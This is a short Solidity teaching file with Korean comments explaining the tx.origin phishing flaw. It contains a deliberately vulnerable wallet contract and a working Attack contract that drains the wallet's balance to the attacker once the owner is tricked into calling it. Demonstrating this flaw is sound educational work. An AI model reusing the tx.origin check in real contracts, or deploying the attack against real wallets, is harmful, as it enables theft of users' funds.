// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

/* 
    tx.origin 을 통한 require 설정이 왜 위험한지?
    해커가 해킹 컨트랙트로 로직을 설계하고 피싱사이트를 통해 
    사용자가 로직을 사용하게 만들면 설계한 대로 자산을 빼돌릴 수 있다.
    
    ** (msg.sender == onwer) 로 require 설정한 경우,
    owner => Attack => MyWallet (msg.sender 는 Attack contract.)
    msg.sender 는 owner 가 아니므로 공격 실패.

    ** (tx.origin == owner) 로 require 설정한 경우,
    owner => Attack => MyWallet (tx.origin 은 owner.)
    tx.origin 은 owner 가 맞음. 공격 성공.
*/

contract MyWallet {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function deposit() public payable {
        payable(this).transfer(msg.value);
    }

    function withdraw(address _to) public payable {
        require(owner == tx.origin,"Owner only.");
        payable(_to).transfer(address(this).balance);
    }
}

contract Attack {
    MyWallet mywallet;
    address owner;

    constructor(MyWallet _MyWallet) {
        mywallet = MyWallet(_MyWallet);
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() public {
        mywallet.withdraw(owner);
    }
}